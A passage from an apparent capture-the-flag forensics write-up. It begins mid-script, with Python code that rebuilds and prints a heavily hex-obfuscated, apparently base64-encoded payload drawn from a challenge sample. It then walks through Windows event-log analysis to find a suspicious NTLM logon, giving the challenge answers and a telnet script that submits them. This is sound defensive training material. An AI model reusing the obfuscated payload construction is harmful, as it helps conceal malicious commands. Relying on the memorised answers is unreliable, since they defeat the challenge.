    command = command + decodeChar(decodeAsHex("38392031313920363520313033203635203637203438203635203834203831203636203130382036352037322038312036352039372036352036362031313820363520373120") + decodeAsHex("3831203635203733203635"))
    command = command + decodeChar(decodeAsHex("363620383120") + decodeAsHex("36352036392035362036352038352031313920363620383520363520363720363520363520373620383120363620373320363520373120383520363520383920383120363620313037203635"))
    command = command + decodeChar(decodeAsHex("37312038352036352039392031303320363620313232203635203637203635203635203831203635203636203535") + decodeAsHex("203635203637203733203635203831203831203636203439203635203732203831203635"))
    command = command + decodeChar(decodeAsHex("3937203635203636203131382036352037322037332036352039372038312036362035342036352037312036392036352031303020363520363620313132203635203731203536203635203938") + decodeAsHex("20313033"))
    command = command + decodeChar(decodeAsHex("3635203130352036352036382034382036352037342036352036362031313220363520373220343820363520373320363520363520") + decodeAsHex("3131362036352036392037332036352039382031313920363620313037"))
    command = command + decodeChar(decodeAsHex("363520373220") + decodeAsHex("3130372036352037332036352036352031313120363520373020313135203635203835203131392036362035332036352037322037372036352031303020363520363620313038203635203731"))
    command = command + decodeChar(decodeAsHex("3438203635") + decodeAsHex("203736203130332036362038352036352037312038352036352031303120363520363620343820363520363720353220363520383220383120363620313137203635203731203737203635203938"))
    command = command + decodeChar(decodeAsHex("3131392036362031303720363520373120313037203635203938203130332036362031313020363520373020343820363520373920313033203635203534203635203730203835203635") + decodeAsHex("203836203635203636"))
    command = command + decodeChar(decodeAsHex("37312036352036382031303320363520373620313033203636203732203635203731") + decodeAsHex("20383520363520313030203635203636203637203635203732203130372036352031303020363520363620313038203635"))
    command = command + decodeChar(decodeAsHex("3732203737203635203735203635203635203130372036352037312038352036352037352031313920363520313037203635203732203733203635203735203831203635") + decodeAsHex("20313033203635203637203438"))
    command = command + decodeChar(decodeAsHex("36352039372031303320363620") + decodeAsHex("3131382036352037312031303720363520393820313033203635203130332036352036372039392036352037332036352036352031313020363520363720313037203635"))
    command = command + decodeChar(decodeAsHex("313032") + decodeAsHex("20383120363520313033203635203732203737203635203938203635203636203130382036352037312038352036352039392036352036352031303320363520363820363520363520373620313033"))
    command = command + decodeChar(decodeAsHex("363520353220363520373220343820363520383320363520363620") + decodeAsHex("3835203635203639203733203635203130312031313920363520343920363520373220383520363520393920363520363520313232203635"))
    command = command + decodeChar(decodeAsHex("373220373320363520383820313139203635203132322036352036382038312036352037382038") + decodeAsHex("31203636203533203635203730203536203635203938203831203635203438203635203731203737203635"))
    return command + decodeChar(decodeAsHex("393920313033203635203131392036352036382038352036352031303220383120") + decodeAsHex("3635203631"))

print(getBase64EncodedPayload())
```

![2022-10-24-23-46-51.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1666848748609/ZGuHj3NpS.png align="left")

![2022-10-24-23-48-47.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1666848686166/RVgJYqeCz.png align="left")

## Downgrade

> During recent auditing, we noticed that network authentication is not forced upon remote connections to our Windows 2012 server. That led us to investigate our system for suspicious logins further. Provided the server's event logs, can you find any suspicious successful login?

Given: Docker address, archive

![2022-10-26-19-02-18.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1666849028622/1D5JLI8L6.png align="left")

🔸 **Which event log contains information about logon and logoff events? (for example: Setup)**

```plaintext
apt intstall python3-evtx
```

```plaintext
for f in Logs/; do mv "$f" "${f// /_}"; done
```

```plaintext
for file in $(find Logs/ -iname "*.evtx")
do
	evtx_dump.py "$file" > Logs.parsed/`basename "$file"`.xml
	echo "$file: $?" >> conversion.log
done
```

> These steps are not required but helps answering future questions.

Answer: `Security`

🔸 **What is the event id for logs for a successful logon to a local computer? (for example: 1337)**

Source

* https://www.manageengine.com/products/active-directory-audit/kb/windows-security-log-event-id-4624.html
    

Answer: `4624`

🔸 **Which is the default Active Directory authentication protocol? (for example: http)**

Answer: `kerberos` (Google that, if unknown to you)

🔸 **Looking at all the logon events, what is the AuthPackage that stands out as different from all the rest? (for example: http)**

```plaintext
$ cat Logs.parsed/Security.evtx.xml | grep -i "authenticationpackage" | sort | uniq -c
      9 <Data Name="AuthenticationPackageName">-</Data>
     16 <Data Name="AuthenticationPackageName">Kerberos</Data>
   1909 <Data Name="AuthenticationPackageName">Negotiate</Data>
     27 <Data Name="AuthenticationPackageName">NTLM</Data>
```

```plaintext
cat Logs.parsed/Security.evtx.xml | grep -i "AuthenticationPackageName\">NTLM<" -A 12 -B 25 | less
```

```plaintext
cat Logs.parsed/Security.evtx.xml | grep -i "AuthenticationPackageName\">NTLM<" -A 12 -B 25 | grep -i "<Computer>" -n
13:<Computer>WIN-HRJHA99CCDO</Computer>
52:<Computer>VAGRANT-BA88BF0</Computer>
91:<Computer>VAGRANT-BA88BF0</Computer>
130:<Computer>VAGRANT-BA88BF0</Computer>
169:<Computer>VAGRANT-BA88BF0</Computer>
208:<Computer>VAGRANT-BA88BF0</Computer>
247:<Computer>srv01</Computer>
286:<Computer>srv01</Computer>
325:<Computer>srv01</Computer>
364:<Computer>srv01</Computer>
403:<Computer>srv01</Computer>
442:<Computer>srv01</Computer>
481:<Computer>srv01</Computer>
520:<Computer>srv01</Computer>
559:<Computer>srv01</Computer>
598:<Computer>srv01</Computer>
637:<Computer>srv01</Computer>
676:<Computer>srv01.boocorp.htb</Computer>
715:<Computer>srv01.boocorp.htb</Computer>
754:<Computer>srv01.boocorp.htb</Computer>
793:<Computer>srv01.boocorp.htb</Computer>
832:<Computer>srv01.boocorp.htb</Computer>
871:<Computer>srv01.boocorp.htb</Computer>
910:<Computer>srv01.boocorp.htb</Computer>
949:<Computer>srv01.boocorp.htb</Computer>
988:<Computer>srv01.boocorp.htb</Computer>
1027:<Computer>srv01.boocorp.htb</Computer>
```

As you can see suspicious `Computer` entries `srv01.boocorp.htb` are present in NTLM packages.

Answer: `ntlm`

🔸 **What is the timestamp of the suspicious login (yyyy-MM-ddTHH:mm:ss) UTC? (for example, 2021-10-10T08:23:12)**

```plaintext
$ cat Logs.parsed/Security.evtx.xml | grep -i "4624</EventID>" -A 36 -B 1 | grep -i "srv01.boocorp.htb" -B 12 -A 32 | grep -i "ionpackagename\">ntlm" -A 12 -B 25
```

![2022-10-26-20-57-50.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1666849456190/YPdAemAi-.png align="left")

Answer: `2022-09-28T13:10:57`

![2022-10-26-21-09-11.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1666849496962/ZsETrKVs4.png align="left")

And the script that automates that:

```py
#!/usr/bin/python

from telnetlib import Telnet

host = "64.227.41.190"
port = 32645

def tcSend(tc, msg):
    tc.write(msg.encode('ascii') + b"\n")

def tcReadUntil(tc, end):
    return tc.read_until(end.encode('ascii'), 2).decode("ascii")

def tcReadEager(tc):
    return tc.read_eager()

if __name__ == "__main__":
    try:
        with Telnet(host, port) as tc:
            while True:
                print(tcReadUntil(tc, 'le: Setup)'))
                tcSend(tc, 'Security')
                print(tcReadUntil(tc, 'example: 1337)'))
                tcSend(tc, '4624') 
                print(tcReadUntil(tc, 'http)'))
                tcSend(tc, 'kerberos') 
                print(tcReadUntil(tc, 'http)'))
                tcSend(tc, 'ntlm')
                print(tcReadUntil(tc, '08:23:12)'))
                tcSend(tc, '2022-09-28T13:10:57')
                print(tcReadUntil(tc, '\n)'))
    except:
        print("Connection closed.")
```

%%[follow-cta]